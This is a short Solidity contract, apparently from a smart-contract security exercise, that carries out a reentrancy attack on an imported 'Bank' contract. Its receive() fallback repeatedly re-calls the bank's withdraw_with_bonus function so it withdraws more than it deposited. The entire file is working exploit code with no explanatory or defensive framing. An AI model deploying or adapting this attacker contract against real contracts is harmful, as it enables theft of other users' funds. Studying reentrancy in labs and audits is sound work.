// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./Bank.sol";

contract BankDrop {

    Bank private sourceBank;

    constructor(address payable _sourceBank) {
        sourceBank = Bank(_sourceBank);
    }

    receive() external payable {
        sourceBank.withdraw_with_bonus();
    }

    function addBalance() public payable {
        address(sourceBank).call{value: msg.value, gas: 1000000}(
            ""
        );
    }

    function withdraw_with_bonus() public payable {
        sourceBank.withdraw_with_bonus();
    }
}
